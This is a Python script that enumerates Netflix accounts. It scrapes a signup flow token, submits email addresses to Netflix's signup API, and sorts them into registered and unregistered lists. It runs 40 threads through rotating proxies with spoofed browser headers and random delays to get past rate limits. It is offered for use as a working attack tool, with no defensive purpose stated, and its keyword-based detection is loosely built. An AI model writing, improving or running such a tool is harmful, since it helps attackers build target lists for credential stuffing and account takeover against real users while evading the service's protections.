#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Netflix Email Checker - Fast & Powerful
Checks if an email is registered on Netflix via signup flow API
Supports HTTP/HTTPS/SOCKS proxies with automatic rotation
40 workers for maximum speed
"""

import requests
import re
import time
import random
from concurrent.futures import ThreadPoolExecutor
import threading

from proxy_manager import ProxyManager


class NetflixChecker:
    def __init__(self, proxy_manager: ProxyManager = None, max_workers: int = 40):
        self.proxy_manager = proxy_manager
        self.max_workers = max_workers

    def _get_session(self):
        s = requests.Session()
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
        return s

    def _extract_flwssn(self, session: requests.Session, proxy_url: str = None):
        proxies = None
        if proxy_url:
            proxies = {'http': proxy_url, 'https': proxy_url}

        try:
            r = session.get(
                'https://www.netflix.com/signup/regform',
                proxies=proxies,
                timeout=15,
                allow_redirects=True
            )

            for cookie in session.cookies:
                if 'flwssn' in str(cookie.name).lower():
                    return str(cookie.value)

            patterns = [
                r'"flwssn"\s*:\s*"([^"]+)"',
                r'"flowSessionId"\s*:\s*"([^"]+)"',
                r'flwssn=([^&";]+)',
                r'("authURL"|"authurl")\s*:\s*"([^"]+)"',
            ]
            for pat in patterns:
                m = re.search(pat, r.text, re.IGNORECASE)
                if m:
                    if len(m.groups()) == 1:
                        return m.group(1)
                    else:
                        return m.group(2)

            return None
        except Exception:
            return None

    def _check_single(self, email: str, proxy_dict: dict = None):
        proxy_url = None
        if proxy_dict and 'url' in proxy_dict:
            proxy_url = proxy_dict['url']
        elif self.proxy_manager:
            pd = self.proxy_manager.get_next()
            if pd:
                proxy_url = pd['url']

        session = self._get_session()
        flwssn = self._extract_flwssn(session, proxy_url)
        if not flwssn:
            return (email, False, "no_flow_token")

        try:
            proxies = None
            if proxy_url:
                proxies = {'http': proxy_url, 'https': proxy_url}

            url = "https://www.netflix.com/api/node"

            payload = {
                "operationName": "CLCSWebInitSignup",
                "variables": {
                    "inputUserJourneyNode": "WELCOME",
                    "locale": "en-US",
                    "inputFields": [
                        {"name": "flwssn", "value": {"stringValue": flwssn}},
                        {"name": "email", "value": {"stringValue": email}},
                        {"name": "password", "value": {"stringValue": "CheckerPass123!"}},
                        {"name": "hasPhoneNumber", "value": {"booleanValue": False}},
                        {"name": "rememberMe", "value": {"booleanValue": False}},
                        {"name": "registrationType", "value": {"stringValue": "emailOnly"}}
                    ]
                },
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "3c34a81e53b6585741e368641ae0b4c14241a4f9a2e3b94b0f48d1e0d7e5569b"
                    }
                }
            }

            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://www.netflix.com/signup/regform',
                'Origin': 'https://www.netflix.com',
                'X-Netflix-Client-Session-Id': flwssn,
            }

            r = session.post(
                url,
                json=payload,
                headers=headers,
                proxies=proxies,
                timeout=15
            )

            text = r.text.lower()

            exists_indicators = [
                'welcome back',
                'already have an account',
                'already a member',
                'signin',
                'sign in to continue',
                'use your existing account',
                'registered',
                'hasaccount',
                'exists',
            ]

            not_exists_indicators = [
                'create your account',
                'sign up',
                'signup',
                'start your membership',
                'welcome to netflix',
                'choose a plan',
                'finish setting up',
            ]

            for indicator in exists_indicators:
                if indicator in text:
                    return (email, True, "registered")

            for indicator in not_exists_indicators:
                if indicator in text:
                    return (email, False, "not_registered")

            if 'errors' in text and 'email' in text:
                return (email, True, "registered_email_error")

            return (email, False, "unknown_response")

        except requests.exceptions.ProxyError:
            return (email, False, "proxy_error")
        except requests.exceptions.Timeout:
            return (email, False, "timeout")
        except requests.exceptions.ConnectionError:
            return (email, False, "connection_error")
        except Exception as e:
            return (email, False, str(e))

    def check_batch(self, emails, progress_callback=None):
        valid_emails = []
        invalid_emails = []
        counters = {'done': 0, 'errors': 0}
        lock = threading.Lock()
        total = len(emails)

        def worker(email):
            proxy = self.proxy_manager.get_next() if self.proxy_manager else None
            email_result, is_valid, msg = self._check_single(email, proxy)

            with lock:
                counters['done'] += 1
                if is_valid:
                    valid_emails.append(email)
                else:
                    invalid_emails.append(email)
                    if msg not in ('not_registered', 'no_flow_token'):
                        counters['errors'] += 1

                if progress_callback and (counters['done'] % 20 == 0 or counters['done'] == total):
                    progress_callback(
                        counters['done'],
                        total,
                        len(valid_emails),
                        len(invalid_emails),
                        counters['errors']
                    )

            time.sleep(random.uniform(0.2, 0.5))

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            list(executor.map(worker, emails))

        if progress_callback:
            progress_callback(
                total,
                total,
                len(valid_emails),
                len(invalid_emails),
                counters['errors']
            )

        return valid_emails, invalid_emails, counters['errors']